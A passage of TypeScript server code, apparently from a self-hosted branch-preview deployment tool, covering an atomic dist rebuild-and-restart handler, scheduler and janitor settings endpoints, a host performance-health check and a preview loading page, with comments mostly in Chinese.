              validateHeartbeatLabel = event.message;
              sendSSE(res, 'validate-progress', {
                phase: event.phase,
                status: event.status,
                title: event.message,
                ...(event.timings || {}),
              });
              send(event.phase, event.status, event.message);
            },
          });
        } finally {
          clearInterval(validateHeartbeat);
        }
      };
      let validation: Awaited<ReturnType<typeof validateBuildReadiness>>;
      if (hotEligible) {
        // 警告 Bugbot 9095dfbb + 1f4db209:即使 hot path 也要跑 pnpm install
        // (~5s no-op,修复 node_modules 残缺;新 .ts 加 import 一个已声明但
        // 没装的 dep 时 esbuild 会失败)。**只**跳过 tsc --noEmit。
        send('validate', 'running', '热路径预检: pnpm install --prefer-offline (skipTsc)…');
        validation = await runVisibleValidation({ skipTsc: true });
        timingRecorder.mergeValidation(validation.timings);
        if (!validation.ok) {
          send('validate', 'error', `pnpm install 失败: ${validation.error.slice(0, 300)}`);
          sendSSE(res, 'error', { message: `force-sync 已中止 — pnpm install 失败: ${validation.error}` });
          res.end();
          recordSelfUpdate({
            ts: new Date().toISOString(),
            branch: branch || target || '',
            fromSha,
            toSha: fromSha,
            trigger: 'force-sync',
            status: 'aborted',
            durationMs: Date.now() - startedAt,
            error: `pnpm install 失败: ${(validation.error || '').slice(0, 1500)}`,
            actor,
          });
          return;
        }
        send('validate', 'done', validation.summary);
      } else {
      send('validate', 'running', '预检: pnpm install + tsc --noEmit…');
      validation = await runVisibleValidation();
      timingRecorder.mergeValidation(validation.timings);
      if (!validation.ok) {
        send('validate', 'error', `预检失败: ${validation.error.slice(0, 300)}`);
        sendSSE(res, 'error', {
          message: `force-sync 已中止 — ${target} 的代码没过预检: ${validation.error}`,
        });
        res.end();
        // 流水标 'aborted' 同 self-update 处理 — 安全中止,不是真正的故障。
        // dist 完好，cds 继续跑老版本，下次重启 systemd ExecStartPre 用现有 dist。
        recordSelfUpdate({
          ts: new Date().toISOString(),
          branch: branch || target || '',
          fromSha,
          toSha: fromSha,
          trigger: 'force-sync',
          status: 'aborted',
          durationMs: Date.now() - startedAt,
          error: `预检失败 (${validation.stage}): ${(validation.error || '').slice(0, 1500)}`,
          actor,
        });
        return;
      }
      send('validate', 'done', validation.summary);
      } // end of cold-path validate
      const timingSummary = formatValidationTimings(validation.timings);
      sendSSE(res, 'timings', {
        phase: 'validate',
        title: `预检耗时: ${timingSummary}`,
        ...validation.timings,
      });
      send('validate-timings', 'info', `预检耗时: ${timingSummary}`);
      if (validation.webWarning) {
        send('web-warning', 'warning', validation.webWarning.slice(0, 400));
      }

      // Step 5+6: Atomic 重建 dist —— 编译到 dist.next/，验证后才 swap。
      //
      // * Codex Review 2026-05-06 P2 修复（"Preserve old dist until rebuild
      // succeeds"）：原版本先 `rm -rf dist` 再跑 npx tsc，如果 tsc 中途
      // 因 ENOSPC / cgroup OOM / 权限错被 kill，handler return 后 host 上
      // 没 dist/index.js，下一次 systemd 重启就起不来 —— 必须 SSH 救场。
      //
      // 修法：tsc --outDir 到独立的 dist.next/，全程不动旧 dist。
      //   - 编译失败 → 删 dist.next，旧 dist 保留，cds 继续跑
      //   - 编译成功 + dist.next/index.js 存在 → 原子三步 swap：
      //       1) 旧 dist → dist.old.<ts>  （备份）
      //       2) dist.next → dist          （上线新版）
      //       3) 删 dist.old.<ts>          （清理）
      //   - 第 2 步失败（罕见）会回滚把 dist.old.<ts> 改回 dist。
      // 任何一步失败，cds 永远有可启动的 dist，不再需要人工介入。
      // 用户反馈 2026-05-06:之前清 dist/.tsbuildinfo 让重 build 走全量(慢
      // 30-50s)。incremental cache 本身就是为"代码改了重 build 也要快"准备的,
      // 主动清等于自废武功。**不**清 .tsbuildinfo,只清 dist.next/(上一次失败
      // 的孤儿)+ dist.old.*(rmSync 失败的孤儿)。
      send('cache', 'running', '清理孤儿目录(保留 .tsbuildinfo 让 tsc 走增量)…');
      const removed: string[] = [];
      // dist.next 残留(上次失败留下的)
      try {
        const next = path.join(cdsDir, 'dist.next');
        if (fs.existsSync(next)) {
          fs.rmSync(next, { recursive: true, force: true });
          removed.push('dist.next/ (stale)');
        }
      } catch { /* tolerate */ }
      // 警告 Bugbot 2026-05-06 238e81a5:atomic swap 第 3 步 rmSync(dist.old.<ts>) 偶尔
      // 静默失败(disk pressure / 文件正被 inotify 监听等),孤儿 dist.old.* 累积。
      // 每次 self-force-sync 启动前扫一遍,一并清掉旧的 dist.old.* (每个都是 full
      // 编译产物,几十到几百 MB)。失败容忍,本来就是兜底清理。
      try {
        const entries = fs.readdirSync(cdsDir);
        for (const name of entries) {
          if (name.startsWith('dist.old.')) {
            try {
              fs.rmSync(path.join(cdsDir, name), { recursive: true, force: true });
              removed.push(`${name} (orphan)`);
            } catch { /* tolerate */ }
          }
        }
      } catch { /* tolerate */ }
      send('cache', 'done', removed.length > 0 ? `已清: ${removed.join(', ')}` : '无缓存可清');

      // 编译到 dist.next/,旧 dist/ 全程不动。
      // 用户反馈 2026-05-06:tsc 30-50s 太慢,改 esbuild + 按需并行 tsc --noEmit:
      //   - esbuild emit JS:~1s(纯 syntax 转译,无类型检查)
      //   - tsc --noEmit:5-30s(增量;有 .tsbuildinfo 命中可秒级)
      //
      // 警告 Bugbot 858bca04 (Medium):**只**在 hotEligible 时并行跑 tsc。
      // cold path 的 validateBuildReadiness(line ~9089)已经跑过 tsc --noEmit
      // 通过了,这里再跑一次纯属重复(浪费 5-30s)。
      // hot path 的 validate 设了 skipTsc=true,所以这里必须补一次 tsc 兜底。
      const skipTscInBuild = !hotEligible;
      send(
        'build-backend',
        'running',
        skipTscInBuild
          ? '编译 cds/dist.next/(esbuild — cold path validate 已跑过 tsc)…'
          : '编译 cds/dist.next/(esbuild + tsc --noEmit 并行)…',
      );
      const buildStartedAt = Date.now();
      const tasks: Array<Promise<Awaited<ReturnType<typeof shell.exec>>>> = [
        shell.exec(
          'node scripts/build-dist-esbuild.mjs',
          { cwd: cdsDir, timeout: 60_000, env: { OUT_DIR: 'dist.next' } },
        ),
      ];
      if (!skipTscInBuild) {
        tasks.push(
          shell.exec('./node_modules/.bin/tsc --noEmit', { cwd: cdsDir, timeout: 120_000 }),
        );
      }
      const buildResults = await Promise.all(tasks);
      const esbuildRes = buildResults[0];
      const tscCheckRes = skipTscInBuild ? null : buildResults[1];
      const buildElapsed = ((Date.now() - buildStartedAt) / 1000).toFixed(1);
      timingRecorder.merge({ buildBackendMs: Date.now() - buildStartedAt });
      if (esbuildRes.exitCode !== 0) {
        const errMsg = combinedOutput(esbuildRes).slice(0, 1500);
        try { fs.rmSync(path.join(cdsDir, 'dist.next'), { recursive: true, force: true }); } catch { /* ignore */ }
        send('build-backend', 'error', `esbuild 编译失败(旧 dist 保留): ${errMsg.slice(0, 300)}`);
        sendSSE(res, 'error', { message: `cds/dist.next 编译失败 — cds 继续跑老版本,请检查代码:\n${errMsg.slice(0, 800)}` });
        res.end();
        recordFailure(`esbuild 编译失败: ${errMsg.slice(0, 300)}`);
        return;
      }
      if (tscCheckRes && tscCheckRes.exitCode !== 0) {
        const errMsg = combinedOutput(tscCheckRes).slice(0, 1500);
        try { fs.rmSync(path.join(cdsDir, 'dist.next'), { recursive: true, force: true }); } catch { /* ignore */ }
        send('build-backend', 'error', `tsc 类型检查失败(旧 dist 保留): ${errMsg.slice(0, 300)}`);
        sendSSE(res, 'error', { message: `cds/ 类型检查失败 — cds 继续跑老版本,请检查代码:\n${errMsg.slice(0, 800)}` });
        res.end();
        recordFailure(`tsc 类型检查失败: ${errMsg.slice(0, 300)}`);
        return;
      }
      send(
        'build-backend',
        'done',
        skipTscInBuild
          ? `编译完成 (${buildElapsed}s) — esbuild emit(tsc 已在 validate 阶段过)`
          : `编译完成 (${buildElapsed}s) — esbuild emit + tsc --noEmit 并行通过`,
      );
      const nextEntry = path.join(cdsDir, 'dist.next', 'index.js');
      if (!fs.existsSync(nextEntry)) {
        try { fs.rmSync(path.join(cdsDir, 'dist.next'), { recursive: true, force: true }); } catch { /* ignore */ }
        send('build-backend', 'error', 'tsc 报成功但 dist.next/index.js 不存在（旧 dist 保留）');
        sendSSE(res, 'error', { message: 'tsc 编译报成功但 dist.next/index.js 缺失，已中止重启避免 cds 起不来' });
        res.end();
        recordFailure('tsc exit=0 but dist.next/index.js missing');
        return;
      }

      // Atomic swap: dist → dist.old.<ts> → dist.next → dist
      const swapTs = Date.now();
      const distPath = path.join(cdsDir, 'dist');
      const distOldPath = path.join(cdsDir, `dist.old.${swapTs}`);
      const distNextPath = path.join(cdsDir, 'dist.next');
      try {
        if (fs.existsSync(distPath)) {
          fs.renameSync(distPath, distOldPath);
        }
        try {
          fs.renameSync(distNextPath, distPath);
        } catch (renameErr) {
          // 极罕见的中间失败 —— 把备份恢复回去保证 dist 始终存在
          if (fs.existsSync(distOldPath)) {
            try { fs.renameSync(distOldPath, distPath); } catch { /* ignore — already broken */ }
          }
          throw renameErr;
        }
        // 清理备份（保不保都不影响 cds 运行，rmSync 失败也忽略）
        try { fs.rmSync(distOldPath, { recursive: true, force: true }); } catch { /* ignore */ }
        // 警告 Bugbot 2026-05-06 0c17e470:之前没人写 dist/.build-sha,
        // self-force-sync 顶部的 fast-path no-op 检测永远 false → 死代码。
        // swap 成功后**显式写**当前 commit 的 full SHA,下次同 commit 触发
        // self-force-sync 即可秒级 return。
        try {
          fs.writeFileSync(path.join(distPath, '.build-sha'), newHeadFull);
        } catch { /* tolerate — fast-path 失效但功能不受影响 */ }
      } catch (swapErr) {
        send('build-backend', 'error', `dist 原子替换失败: ${(swapErr as Error).message}`);
        sendSSE(res, 'error', { message: `dist 原子替换失败,已尝试回滚: ${(swapErr as Error).message}` });
        res.end();
        recordFailure(`dist atomic swap failed: ${(swapErr as Error).message}`);
        return;
      }
      send('build-backend', 'done', 'dist/ 已原子替换（旧版已删除）');

      // In-process 重建 cds/web/dist —— Bugbot PR #524 第九轮反馈:之前
      // self-force-sync 走 daemon build_web(实测 production 不可靠),会复现
      // "已 force-sync 但前端没变"。与 self-update 共用 runInProcessWebBuild
      // helper 保证两端口行为一致。
      timingRecorder.merge(await runInProcessWebBuild(newHead, send, res));

      // 同 self-update:默认不等排空;显式 drain=true 或 drainTimeoutMs>0 才等待。
      const drainStartedAt = Date.now();
      const restartDrain = restartDrainTimeoutMs > 0
        ? await (async () => {
            send('drain', 'running', `等待 in-flight 分支操作排空(最多 ${Math.floor(restartDrainTimeoutMs / 1000)}s)…`);
            return waitForRestartSafeBranchOperationsForRoute('api.self-force-sync', restartDrainTimeoutMs);
          })()
        : { ok: true, active: [] };
      const drainMs = Date.now() - drainStartedAt;
      timingRecorder.merge({ drainMs });
      if (restartDrainTimeoutMs <= 0) {
        send('drain', 'done', '已跳过排空等待(默认策略,立即重启)');
      } else if (!restartDrain.ok) {
        send(
          'drain',
          'warning',
          `优雅窗口超时,仍有 ${restartDrain.active.length} 个分支写操作在跑——直接 restart,在跑的 op 会被 webhook 重试`,
        );
      } else {
        send('drain', 'done', `分支操作已排空 (${Math.floor(drainMs / 1000)}s)`);
      }

      // 流水成功记录 — 同 self-update 的逻辑,记录"管理流程层面成功"。
      recordSelfUpdate({
        ts: new Date().toISOString(),
        branch: branch || target || '',
        fromSha,
        toSha: newHead || fromSha,
        trigger: 'force-sync',
        status: 'success',
        durationMs: Date.now() - startedAt,
        actor,
        // 把热路径决策记到流水里,UI 历史可分辨"重启 / 热重载 / no-op"
        ...({ updateMode: hotEligible ? 'hot-reload' : 'restart' } as Record<string, unknown>),
      });
      // Same durability requirement as /api/self-update: this code path
      // intentionally exits the daemon. Bound this flush so a stuck write-behind
      // queue cannot leave old code running after dist/ has already been swapped.
      await flushSelfUpdateStateBeforeRestart({
        trigger: 'force-sync',
        branch: branch || target || '',
        fromSha,
        toSha: newHead || fromSha,
        actor,
      });

      // * 2026-05-06 双模式 self-update 出口:
      // 不论 hot 还是 cold,都通过 process.exit + systemd Restart 重启进程。
      // 警告 Bugbot bb81f978 + 8af6751a 教训:之前以为 `node --watch=dist` 能热重载,
      // 但 (a) --watch 语法错了 (b) atomic rename 让 inode 变化 inotify 失效,
      // 即使写对了也不工作。**唯一物理可行的 hot path 优化是跳过 validate,
      // 仍然要走 systemd 重启**。
      // 区别仍然有意义记录(updateMode):
      //   - hot-reload: 跳过 validate,~15-25s 总耗时
      //   - restart: 走完整 validate,~70-95s 总耗时
      const exitMessage = hotEligible
        ? `热路径完成: dist 已更新到 ${newHead},systemd 软重启(~5-10s,跳过了 validate)。改动 ${impact.hotReloadablePaths.length} 个应用文件。`
        : `完整重启: HEAD=${newHead}${impact.restartTriggers.length > 0 ? `(${impact.restartTriggers.length} 处改动需重启)` : ''}。`;
      send('restart', 'running', exitMessage);
      sendSSE(res, 'done', {
        message: exitMessage,
        commitHash: newHead,
        mode: hotEligible ? 'hot-reload' : 'restart',
        ...(hotEligible
          ? { hotReloadFiles: impact.hotReloadablePaths.length }
          : { restartReasons: impact.restartTriggers.slice(0, 5).map((t) => t.reason) }),
      });
      res.end();

      // Same restart technique as /api/self-update — spawn a detached bash
      // that runs exec_cds.sh daemon and let the current process die after
      // a short grace period so the child can bind the port.
      const errorLogPath = path.join(cdsDir, '.cds', 'self-update-error.log');
      try {
        fs.mkdirSync(path.dirname(errorLogPath), { recursive: true });
        fs.appendFileSync(
          errorLogPath,
          `\n=== self-force-sync spawn at ${new Date().toISOString()} (branch=${target}) ===\n`,
        );
        const out = fs.openSync(errorLogPath, 'a');
        const errFd = fs.openSync(errorLogPath, 'a');
        const child = spawn('bash', ['./exec_cds.sh', 'daemon'], {
          cwd: cdsDir,
          detached: true,
          stdio: ['ignore', out, errFd],
          env: { ...process.env },
        });
        child.on('error', (err) => {
          fs.appendFileSync(errorLogPath, `spawn error: ${err.message}\n`);
        });
        child.unref();
        branchOperationCoordinator?.interruptAll('CDS force-sync is restarting the process', 'api.self-force-sync');
        setTimeout(() => process.exit(0), 1000);
      } catch (spawnErr) {
        // If we can't spawn the replacement, at least we've persisted the
        // reset — operator can manually `./exec_cds.sh restart` afterwards.
        try {
          fs.appendFileSync(errorLogPath, `pre-spawn error: ${(spawnErr as Error).message}\n`);
        } catch {
          /* ignore */
        }
      }
    } catch (err) {
      if (!res.writableEnded) {
        sendSSE(res, 'error', { message: (err as Error).message });
        try { res.end(); } catch { /* already ended */ }
      }
      recordFailure(`force-sync 异常: ${(err as Error).message}`);
    } finally {
      // Bugbot 31da8d97 (HIGH):同 /self-update,兜底清 marker。
      stateService.clearSelfUpdateActive();
    }
  });

  // ─────────────────────────────────────────────────────────────────────
  // Warm-pool scheduler API (v3.1)
  // See doc/design.cds.resilience.md §九.
  // When schedulerService is not wired in, these endpoints return a
  // consistent "disabled" payload so Dashboard UIs can degrade gracefully.
  // ─────────────────────────────────────────────────────────────────────

  router.get('/scheduler/state', (_req, res) => {
    if (!schedulerService) {
      res.json({
        enabled: false,
        config: null,
        hot: [],
        cold: [],
        capacityUsage: { current: 0, max: 0 },
      });
      return;
    }
    res.json(schedulerService.getSnapshot());
  });

  // ── PUT /api/scheduler/enabled — flip scheduler on/off from the UI ──
  //
  // Persists the override into state.json via stateService so the toggle
  // survives restart, then calls schedulerService.setEnabled() which
  // starts/stops the background tick loop.
  router.put('/scheduler/enabled', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler service not wired in' });
      return;
    }
    const { enabled } = (req.body || {}) as { enabled?: unknown };
    if (typeof enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是 boolean' });
      return;
    }
    stateService.setSchedulerEnabledOverride(enabled);
    stateService.save();
    schedulerService.setEnabled(enabled);
    res.json({ enabled, source: 'ui-override' });
  });

  // ── PUT /api/scheduler/config — tune scheduler params from the UI ──
  //
  // Body { enabled?, idleTTLSeconds?, maxHotBranches? } — every field is
  // optional and validated independently. Each provided field persists an
  // override to state (survives restart) then mutates the running scheduler.
  // Mirrors the proven /scheduler/enabled pattern; the two routes write the
  // same state overrides so they stay consistent.
  router.put('/scheduler/config', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler service not wired in' });
      return;
    }
    const body = (req.body || {}) as {
      enabled?: unknown;
      idleTTLSeconds?: unknown;
      maxHotBranches?: unknown;
    };

    if (body.enabled !== undefined && typeof body.enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是 boolean' });
      return;
    }
    if (body.idleTTLSeconds !== undefined) {
      const v = body.idleTTLSeconds;
      if (typeof v !== 'number' || !Number.isInteger(v) || v < 60 || v > 86400) {
        res.status(400).json({ error: 'idleTTLSeconds 必须是 60 到 86400 之间的整数（秒）' });
        return;
      }
    }
    if (body.maxHotBranches !== undefined) {
      const v = body.maxHotBranches;
      if (typeof v !== 'number' || !Number.isInteger(v) || v < 0 || v > 100) {
        res.status(400).json({ error: 'maxHotBranches 必须是 0 到 100 之间的整数（0=不限）' });
        return;
      }
    }

    if (typeof body.enabled === 'boolean') {
      stateService.setSchedulerEnabledOverride(body.enabled);
      schedulerService.setEnabled(body.enabled);
    }
    if (typeof body.idleTTLSeconds === 'number') {
      stateService.setSchedulerIdleTTLOverride(body.idleTTLSeconds);
      schedulerService.setIdleTTLSeconds(body.idleTTLSeconds);
    }
    if (typeof body.maxHotBranches === 'number') {
      stateService.setSchedulerMaxHotOverride(body.maxHotBranches);
      schedulerService.setMaxHotBranches(body.maxHotBranches);
    }
    stateService.save();

    res.json({ ...schedulerService.getSnapshot(), source: 'ui-override' });
  });

  router.post('/scheduler/pin/:slug', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    try {
      schedulerService.pin(req.params.slug);
      res.json({ ok: true, slug: req.params.slug, pinned: true });
    } catch (err) {
      res.status(404).json({ error: (err as Error).message });
    }
  });

  router.post('/scheduler/unpin/:slug', (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    try {
      schedulerService.unpin(req.params.slug);
      res.json({ ok: true, slug: req.params.slug, pinned: false });
    } catch (err) {
      res.status(404).json({ error: (err as Error).message });
    }
  });

  router.post('/scheduler/cool/:slug', async (req, res) => {
    if (!schedulerService) {
      res.status(503).json({ error: 'Scheduler not enabled' });
      return;
    }
    const slug = req.params.slug;
    const branch = stateService.getBranch(slug);
    if (!branch) {
      res.status(404).json({ error: `分支 "${slug}" 不存在` });
      return;
    }
    if (schedulerService.isPinned(branch)) {
      res.status(409).json({ error: `分支 "${slug}" 已固定,无法手动休眠` });
      return;
    }
    try {
      await schedulerService.markCold(slug);
      res.json({ ok: true, slug, heatState: 'cold' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Global expiry janitor API ──
  //
  // The janitor deletes branch-local containers/worktrees after the global
  // expiry window. The window is intentionally capped at 7 days.
  router.get('/janitor/state', (_req, res) => {
    if (!janitorService) {
      res.json({
        enabled: false,
        config: null,
        dryRun: { wouldRemove: [], wouldSkip: [] },
        disk: null,
      });
      return;
    }
    res.json(janitorService.getSnapshot());
  });

  // ── GET /api/cds-system/perf-health — 运维健康观测 ──
  //
  // 一处汇总「会拖垮 CDS 的系统性信号」并算成 warnings，治本次性能事故的根因：
  // 预览调度器被禁用 → 空闲分支永不回收 → 容器无限堆积 → 18 核主机 load 28 →
  // 构建越来越慢/失败。这一切此前在面板上完全不可见。本端点把它显性化，监控弹窗
  // 据此红黄告警，让「调度器禁用/主机过载/容器堆积/构建变慢」一眼可见、不再静默复发。
  router.get('/cds-system/perf-health', (_req, res) => {
    const cores = (typeof os.availableParallelism === 'function' ? os.availableParallelism() : os.cpus().length) || 1;
    const load = os.loadavg();
    const loadAvg1 = Number((load[0] || 0).toFixed(2));
    const loadPercent = Math.round((loadAvg1 / cores) * 100);
    const totalMB = Math.round(os.totalmem() / (1024 * 1024));
    const freeMB = Math.round(os.freemem() / (1024 * 1024));
    const memPercent = totalMB > 0 ? Math.round(((totalMB - freeMB) / totalMB) * 100) : 0;

    registry?.refreshEmbeddedMasterLoad();
    const nodes = registry?.getAll() || [];
    const runningContainers = nodes.reduce((sum, n) => sum + (n.runningContainers ?? n.branches.length), 0);

    const snap = schedulerService?.getSnapshot();
    const scheduler = snap
      ? { wired: true, enabled: snap.enabled, maxHotBranches: snap.config.maxHotBranches, idleTTLSeconds: snap.config.idleTTLSeconds, hotCount: snap.hot.length }
      : { wired: false, enabled: false, maxHotBranches: 0, idleTTLSeconds: 0, hotCount: 0 };

    const projects = stateService.getState().projects || [];
    const build = projects.map((p) => {
      const est = stateService.getBranchDeployEstimate(p.id);
      return {
        projectId: p.id,
        name: p.name || p.id,
        sourceMedianMs: est.sourceMedianMs,
        sourceSamples: est.sourceSamples,
        releaseMedianMs: est.releaseMedianMs,
        releaseSamples: est.releaseSamples,
      };
    });

    const warnings: Array<{ level: 'critical' | 'warning'; code: string; message: string }> = [];
    if (scheduler.wired && !scheduler.enabled) {
      warnings.push({ level: 'critical', code: 'scheduler-disabled', message: '预览调度器已禁用：空闲分支不会自动回收，运行容器会无限堆积拖垮主机（本次性能问题根因）。请到调度器设置启用并设 maxHotBranches。' });
    } else if (scheduler.enabled && scheduler.maxHotBranches === 0) {
      warnings.push({ level: 'warning', code: 'scheduler-unlimited', message: '调度器已启用但 maxHotBranches=0（不限）：高峰期热分支数无上限，建议设一个上限防止容器堆积。' });
    }
    if (loadPercent >= 100) {
      warnings.push({ level: 'critical', code: 'load-critical', message: `主机负载 ${loadAvg1} 已超过核数 ${cores}（loadPercent ${loadPercent}%）：构建会显著变慢甚至失败。` });
    } else if (loadPercent >= 80) {
      warnings.push({ level: 'warning', code: 'load-high', message: `主机负载偏高（loadPercent ${loadPercent}%），临近过载。` });
    }
    if (runningContainers > cores * 2) {
      warnings.push({ level: 'warning', code: 'too-many-containers', message: `运行容器 ${runningContainers} 个，超过核数 2 倍（${cores * 2}）：CPU 严重争抢，构建变慢。` });
    }
    for (const b of build) {
      const m = Math.max(b.sourceMedianMs || 0, b.releaseMedianMs || 0);
      if (m > 6 * 60 * 1000) {
        warnings.push({ level: 'warning', code: 'slow-build', message: `项目「${b.name}」构建中位耗时约 ${(m / 60000).toFixed(1)} 分钟，偏慢。` });
      }
    }

    res.json({
      host: { loadAvg1, loadAvg5: Number((load[1] || 0).toFixed(2)), loadAvg15: Number((load[2] || 0).toFixed(2)), cores, loadPercent, memPercent },
      containers: { running: runningContainers },
      scheduler,
      build,
      warnings,
      generatedAt: new Date().toISOString(),
    });
  });

  router.put('/janitor/config', (req, res) => {
    if (!janitorService) {
      res.status(503).json({ error: 'Janitor service not wired in' });
      return;
    }
    const body = (req.body || {}) as {
      enabled?: unknown;
      worktreeTTLDays?: unknown;
    };

    if (body.enabled !== undefined && typeof body.enabled !== 'boolean') {
      res.status(400).json({ error: 'enabled 必须是 boolean' });
      return;
    }
    if (body.worktreeTTLDays !== undefined) {
      const v = body.worktreeTTLDays;
      if (typeof v !== 'number' || !Number.isInteger(v) || v < 1 || v > 7) {
        res.status(400).json({ error: 'worktreeTTLDays 必须是 1 到 7 之间的整数（天）' });
        return;
      }
    }

    if (typeof body.enabled === 'boolean') {
      stateService.setJanitorEnabledOverride(body.enabled);
      janitorService.setEnabled(body.enabled);
    }
    if (typeof body.worktreeTTLDays === 'number') {
      stateService.setJanitorWorktreeTTLOverride(body.worktreeTTLDays);
      janitorService.setWorktreeTTLDays(body.worktreeTTLDays);
    }
    stateService.save();

    res.json({ ...janitorService.getSnapshot(), source: 'ui-override' });
  });

  // P4 Part 18 (G10): POST /api/detect-stack — auto-detect stack.
  //
  // Body: { projectId?, branchId?, path? }
  //
  // The route figures out which filesystem path to scan:
  //   - `path` is absolute → use as-is (rare, escape hatch)
  //   - `branchId` → use that branch's worktree
  //   - `projectId` → use the project's repoPath / cloned repo
  //   - neither → fall back to config.repoRoot
  //
  // Returns the raw StackDetection from detectStack(). BuildProfile
  // form consumers pick dockerImage / installCommand / buildCommand
  // / runCommand from the response. Never throws on unknown stack;
  // the client just shows the summary when confidence is 0.
  router.post('/detect-stack', (req, res) => {
    const { projectId, branchId, path: explicitPath } = (req.body || {}) as {
      projectId?: string;
      branchId?: string;
      path?: string;
    };

    let scanPath: string;
    if (typeof explicitPath === 'string' && explicitPath.length > 0 && path.isAbsolute(explicitPath)) {
      scanPath = explicitPath;
    } else if (branchId) {
      const entry = stateService.getBranch(branchId);
      if (!entry) {
        res.status(404).json({ error: `分支 "${branchId}" 不存在` });
        return;
      }
      scanPath = entry.worktreePath;
    } else if (projectId) {
      scanPath = stateService.getProjectRepoRoot(projectId, config.repoRoot);
    } else {
      scanPath = config.repoRoot;
    }

    try {
      const detection = detectStack(scanPath);
      res.json({ ...detection, scanPath });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  return router;
}

function escapeLoadingPreviewHtml(value: string): string {
  return value.replace(/[&<>"']/g, (char) => {
    switch (char) {
      case '&': return '&amp;';
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '"': return '&quot;';
      default: return '&#39;';
    }
  });
}

function buildLegacyWaitingPreviewHtml(branch: string, status: string, waitingProfile: string): string {
  const safeBranch = escapeLoadingPreviewHtml(branch);
  const safeWaitingProfile = escapeLoadingPreviewHtml(waitingProfile);
  const stageLabel = (value: string): string => {
    switch (value) {
      case 'building': return '构建中';
      case 'starting': return '启动中';
      case 'restarting': return '重启中';
      case 'running': return '已就绪';
      case 'error': return '失败';
      case 'stopping': return '停止中';
      case 'stopped': return '已停止';
      default: return '待命';
    }
  };
  const heading = status === 'error'
    ? '分支部署出现异常'
    : status === 'idle'
      ? '分支当前未运行'
      : status === 'restarting'
        ? '分支环境正在热重启'
        : status === 'building'
          ? '分支环境正在构建'
          : '分支正在刷新中';
  const subheading = status === 'error'
    ? 'CDS 已保留当前状态，请返回控制台查看日志与容器输出。'
    : status === 'idle'
      ? '预览访问不会自动重新部署。请回到 CDS 控制台确认日志后手动重新部署。'
      : `CDS 正在等待服务 ${safeWaitingProfile} 完成启动，稳定后会自动切换到真实页面。`;
  const serviceStatus = status === 'error' ? 'error' : status === 'idle' ? 'idle' : status === 'running' ? 'running' : 'starting';
  const progressPercent = status === 'error' ? 42 : status === 'running' ? 96 : status === 'idle' ? 12 : status === 'starting' ? 86 : 68;
  const services = ['api', 'admin'].map((profileId) => {
    const label = `${profileId} · ${stageLabel(serviceStatus)}${profileId === waitingProfile ? '（正在等待此服务就绪）' : ''}`;
    const color = serviceStatus === 'error' ? '#fca5a5' : serviceStatus === 'running' ? '#f8fafc' : serviceStatus === 'idle' ? '#6b7280' : '#dbe4ee';
    return `<div class="svc" data-profile="${profileId}"><span class="svc-dot" style="--svc-color:${color}">●</span><span>${label}</span></div>`;
  }).join('');

  return `<!DOCTYPE html>
<html lang="zh-CN"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${heading} · ${safeBranch}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{color-scheme:dark;--muted:rgba(245,242,255,.62);--text:#f7f5ff;--error:#fca5a5;--sync:#22c55e}
html,body{min-height:100%}
body{font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#120f17;color:var(--text);min-height:100vh;overflow:hidden}
.shape-grid-bg{position:fixed;inset:0;width:100%;height:100%;display:block;z-index:0;background:#120f17}
body::before{content:"";position:fixed;inset:0;pointer-events:none;background:radial-gradient(900px 620px at 52% 46%,rgba(255,255,255,.08),transparent 36%,rgba(18,15,23,.82) 100%),linear-gradient(90deg,rgba(18,15,23,.88),rgba(18,15,23,.2) 48%,rgba(18,15,23,.82));z-index:1}
.shell{position:relative;z-index:2;min-height:100vh;width:100%;padding:clamp(32px,7vw,92px);display:grid;align-items:center;grid-template-columns:minmax(280px,780px) minmax(0,1fr)}
.content{max-width:780px;text-shadow:0 2px 30px rgba(0,0,0,.72)}
.eyebrow{display:inline-flex;align-items:center;gap:10px;margin-bottom:28px;font-size:11px;letter-spacing:.28em;text-transform:uppercase;color:#ded8ef;font-family:"JetBrains Mono","SFMono-Regular",Menlo,monospace}
.eyebrow::before{content:"";width:7px;height:7px;border-radius:50%;background:#fff;box-shadow:0 0 16px rgba(255,255,255,.72);animation:pulse 1.8s ease-in-out infinite}
h1{font-size:clamp(42px,5.6vw,82px);line-height:.96;letter-spacing:0;margin-bottom:22px;max-width:100%}
.shiny-text{display:inline-block;color:rgba(247,245,255,.78);background:linear-gradient(120deg,rgba(247,245,255,.76) 0%,rgba(247,245,255,.76) 38%,#fff 48%,rgba(255,255,255,.96) 52%,rgba(247,245,255,.76) 62%,rgba(247,245,255,.76) 100%);background-size:220% 100%;-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;animation:shiny-text 3.2s linear infinite;text-shadow:none}
.subtitle{max-width:580px;font-size:clamp(15px,1.45vw,20px);line-height:1.75;color:var(--muted);margin-bottom:28px}
.meta{display:flex;flex-wrap:wrap;gap:12px;margin-bottom:28px}
.chip{position:relative;overflow:hidden;display:inline-flex;align-items:center;gap:8px;padding:9px 14px;border-radius:999px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.035);backdrop-filter:blur(10px);font-size:12px;color:#dde3ea}
.chip::after{content:"";position:absolute;inset:-60% auto -60% -40%;width:42%;background:linear-gradient(90deg,transparent,rgba(245,242,255,.18),transparent);transform:skewX(-18deg);animation:glint 3.6s ease-in-out infinite}
.branch{font-family:"JetBrains Mono","SFMono-Regular",Menlo,monospace;word-break:break-all}
.services{display:flex;flex-direction:column;gap:12px;margin:0 0 28px;max-width:620px}
.svc{position:relative;overflow:hidden;display:flex;align-items:center;gap:12px;padding:13px 0;border-top:1px solid rgba(245,242,255,.13);font-size:15px;line-height:1.5}
